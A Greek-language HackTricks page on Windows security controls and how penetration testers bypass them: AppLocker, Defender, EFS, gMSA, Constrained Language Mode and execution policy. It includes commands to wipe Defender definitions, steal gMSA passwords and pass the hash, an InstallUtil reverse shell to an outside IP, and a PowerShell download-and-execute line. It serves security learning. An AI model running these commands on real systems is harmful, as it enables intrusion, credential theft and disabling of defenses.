# Έλεγχοι ασφαλείας των Windows

{{#include ../../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια application whitelist είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Στόχος είναι η προστασία του περιβάλλοντος από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **application whitelisting solution** της Microsoft και παρέχει στους διαχειριστές συστημάτων έλεγχο σχετικά με το **ποιες εφαρμογές και ποια αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** σε εκτελέσιμα αρχεία, scripts, αρχεία Windows installer, DLLs, packaged apps και packed app installers.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν τα cmd.exe και PowerShell.exe** και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, **όμως όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις βρίσκονται σε blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο ελέγχου του τρέχοντος συνόλου κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **Writable folders** για παράκαμψη της πολιτικής του AppLocker: Αν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή στο `C:\Windows`, υπάρχουν **writable folders** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Τα κοινώς **έμπιστα** binaries [**"LOLBAS's"**](https://lolbas-project.github.io/) μπορούν επίσης να φανούν χρήσιμα για την παράκαμψη του AppLocker.
- Οι **κακογραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
- Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με το όνομα `allowed`** οπουδήποτε και θα επιτρέπεται.
- Οι οργανισμοί συχνά επικεντρώνονται επίσης στο **μπλοκάρισμα του εκτελέσιμου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες τοποθεσίες των εκτελέσιμων του** [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- Η **επιβολή DLL** σπάνια ενεργοποιείται, λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα και του όγκου των δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σταματήσει να λειτουργεί. Επομένως, η χρήση **DLL ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε** κώδικα **Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Αποθήκευση Credentials

### Security Accounts Manager (SAM)

Τα τοπικά credentials βρίσκονται σε αυτό το αρχείο, ενώ οι κωδικοί πρόσβασης είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **credentials** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του subsystem για λόγους Single Sign-On.\
Το **LSA** διαχειρίζεται την τοπική **security policy** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), το **authentication**, τα **access tokens**...\
Το LSA είναι αυτό που θα **ελέγξει** τα παρεχόμενα credentials μέσα στο αρχείο **SAM** (για ένα local login) και θα **επικοινωνήσει** με τον **domain controller** για να πραγματοποιήσει authentication ενός domain user.

Τα **credentials** **αποθηκεύονται** μέσα στη **διεργασία LSASS**: Kerberos tickets, NT και LM hashes, εύκολα decrypted passwords.

### LSA secrets

Το LSA μπορεί να αποθηκεύει ορισμένα credentials στον δίσκο:

- Τον κωδικό πρόσβασης του computer account του Active Directory (μη προσβάσιμος domain controller).
- Τους κωδικούς πρόσβασης των accounts των Windows services
- Κωδικούς πρόσβασης για scheduled tasks
- Περισσότερα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η database του Active Directory. Υπάρχει μόνο σε Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που διατίθεται στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting, όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι **παράκαμψης αυτών των protections**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender**, μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να κάνετε enumerate, μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

Το EFS ασφαλίζει αρχεία μέσω encryption, χρησιμοποιώντας ένα **symmetric key** γνωστό ως **File Encryption Key (FEK)**. Αυτό το key κρυπτογραφείται με το **public key** του χρήστη και αποθηκεύεται μέσα στο **alternative data stream** $EFS του encrypted file. Όταν απαιτείται decryption, το αντίστοιχο **private key** του digital certificate του χρήστη χρησιμοποιείται για την αποκρυπτογράφηση του FEK από το stream $EFS. Περισσότερες λεπτομέρειες είναι διαθέσιμες [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια decryption χωρίς ενέργεια από τον χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε non-EFS file system, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα encrypted files που αποστέλλονται μέσω του network με το SMB/CIFS protocol αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος encryption επιτρέπει **transparent access** στα encrypted files για τον owner. Ωστόσο, η απλή αλλαγή του password του owner και το login δεν επιτρέπει την αποκρυπτογράφηση.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί ένα symmetric FEK, κρυπτογραφημένο με το public key του χρήστη.
- Το decryption χρησιμοποιεί το private key του χρήστη για πρόσβαση στο FEK.
- Αυτόματο decryption πραγματοποιείται υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η network transmission.
- Τα encrypted files είναι προσβάσιμα στον owner χωρίς επιπλέον ενέργειες.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **user** έχει **χρησιμοποιήσει** αυτό το **service**, ελέγχοντας αν υπάρχει αυτό το path:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **access** στο file χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν folder για να κάνετε **encrypt** και **decrypt** όλα τα files

### Decrypting EFS files

#### Όντας Authority System

Αυτός ο τρόπος απαιτεί ο **victim user** να **εκτελεί** ένα **process** μέσα στο host. Αν ισχύει αυτό, χρησιμοποιώντας ένα `meterpreter` session μπορείτε να κάνετε impersonate το token του process του user (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε απλώς να κάνετε `migrate` στο process του user.

#### Γνωρίζοντας το password του user


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των service accounts σε IT infrastructures. Σε αντίθεση με τα παραδοσιακά service accounts, στα οποία συχνά είναι ενεργοποιημένη η ρύθμιση "**Password never expire**", τα gMSAs προσφέρουν μια πιο ασφαλή και εύκολη στη διαχείριση λύση:

- **Automatic Password Management**: Τα gMSAs χρησιμοποιούν ένα σύνθετο password 240 χαρακτήρων, το οποίο αλλάζει αυτόματα σύμφωνα με την policy του domain ή του computer. Αυτή η διαδικασία πραγματοποιείται από το Microsoft Key Distribution Service (KDC), εξαλείφοντας την ανάγκη για manual password updates.
- **Enhanced Security**: Αυτά τα accounts δεν επηρεάζονται από lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, ενισχύοντας την ασφάλειά τους.
- **Multiple Host Support**: Τα gMSAs μπορούν να χρησιμοποιηθούν από multiple hosts, γεγονός που τα καθιστά ιδανικά για services που εκτελούνται σε multiple servers.
- **Scheduled Task Capability**: Σε αντίθεση με τα managed service accounts, τα gMSAs υποστηρίζουν την εκτέλεση scheduled tasks.
- **Simplified SPN Management**: Το system ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα sAMaccount details ή στο DNS name του computer, απλοποιώντας τη διαχείριση του SPN.

Τα passwords των gMSAs αποθηκεύονται στην LDAP property _**msDS-ManagedPassword**_ και γίνονται αυτόματα reset κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτό το password, ένα encrypted data blob γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από authorized administrators και τους servers στους οποίους είναι εγκατεστημένα τα gMSAs, διασφαλίζοντας ένα ασφαλές environment. Για την πρόσβαση σε αυτές τις πληροφορίες απαιτείται secured connection, όπως LDAPS, ή η connection πρέπει να είναι authenticated με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Μπορείτε να διαβάσετε αυτό το password με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)

Επίσης, δείτε αυτήν την [web σελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με τον τρόπο εκτέλεσης μιας **NTLM relay attack** για **ανάγνωση** του **password** ενός **gMSA**.<sup>[[1]](#references)</sup>

### Κατάχρηση ACL chaining για ανάγνωση του managed password ενός gMSA (GenericAll -> ReadGMSAPassword)

Σε πολλά περιβάλλοντα, χρήστες με χαμηλά δικαιώματα μπορούν να αποκτήσουν πρόσβαση σε gMSA secrets χωρίς συμβιβασμό του DC, εκμεταλλευόμενοι κακώς ρυθμισμένα object ACLs:<sup>[[3]](#references)</sup>

- Σε ένα group που μπορείτε να ελέγξετε (π.χ. μέσω GenericAll/GenericWrite) έχει εκχωρηθεί `ReadGMSAPassword` σε ένα gMSA.
- Προσθέτοντας τον εαυτό σας σε αυτό το group, κληρονομείτε το δικαίωμα ανάγνωσης του `msDS-ManagedPassword` blob του gMSA μέσω LDAP και παράγετε αξιοποιήσιμα NTLM credentials.

Τυπική ροή εργασίας:

1) Εντοπίστε τη διαδρομή με το BloodHound και σημειώστε τα foothold principals σας ως Owned. Αναζητήστε edges όπως:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Προσθέστε τον εαυτό σας στο ενδιάμεσο group που ελέγχετε (παράδειγμα με bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Διαβάστε το managed password του gMSA μέσω LDAP και υπολογίστε το NTLM hash. Το NetExec αυτοματοποιεί την εξαγωγή του `msDS-ManagedPassword` και τη μετατροπή του σε NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Κάντε authenticate ως το gMSA χρησιμοποιώντας το NTLM hash (δεν απαιτείται plaintext). Αν ο λογαριασμός ανήκει στην ομάδα Remote Management Users, το WinRM θα λειτουργήσει απευθείας:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Σημειώσεις:
- Οι αναγνώσεις LDAP του `msDS-ManagedPassword` απαιτούν sealing (π.χ. LDAPS/sign+seal). Τα Tools το χειρίζονται αυτόματα.
- Στα gMSAs συχνά εκχωρούνται τοπικά δικαιώματα, όπως WinRM. Επικυρώστε τη συμμετοχή σε groups (π.χ. Remote Management Users) για να σχεδιάσετε lateral movement.
- Αν χρειάζεστε μόνο το blob για να υπολογίσετε μόνοι σας το NTLM, δείτε τη δομή MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

Το **Local Administrator Password Solution (LAPS)**, το οποίο είναι διαθέσιμο για λήψη από τη [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης του τοπικού Administrator. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαιοποιημένοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκή εκχωρημένα δικαιώματα, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης του local admin.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως ο αποκλεισμός αντικειμένων COM, η έγκριση μόνο εγκεκριμένων τύπων .NET, workflows που βασίζονται σε XAML, classes του PowerShell και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Σε τρέχοντα Windows αυτό το Bypass δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το κάνετε compile ίσως χρειαστεί** **να** _**προσθέσετε μια αναφορά**_ -> _Browse_ ->_Browse_ -> να προσθέσετε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **να αλλάξετε το project σε .Net4.5**.

#### Άμεσο bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε Powershell** code σε οποιαδήποτε process και να κάνετε bypass το constrained mode. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Από προεπιλογή έχει οριστεί σε **restricted.** Οι βασικοί τρόποι για να κάνετε bypass αυτή την policy:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την authentication χρηστών.

Το SSPI είναι υπεύθυνο για την εύρεση του κατάλληλου protocol για δύο μηχανήματα που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος γι' αυτό είναι το Kerberos. Στη συνέχεια, το SSPI διαπραγματεύεται ποιο authentication protocol θα χρησιμοποιηθεί. Αυτά τα authentication protocols ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε Windows machine με τη μορφή DLL και και τα δύο machines πρέπει να υποστηρίζουν το ίδιο, ώστε να μπορούν να επικοινωνήσουν.

### Main SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, το password σε μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του protocol που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το default)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει several methods ή μόνο ένα.

## UAC - User Account Control

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι ένα feature που ενεργοποιεί ένα **consent prompt για elevated activities**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
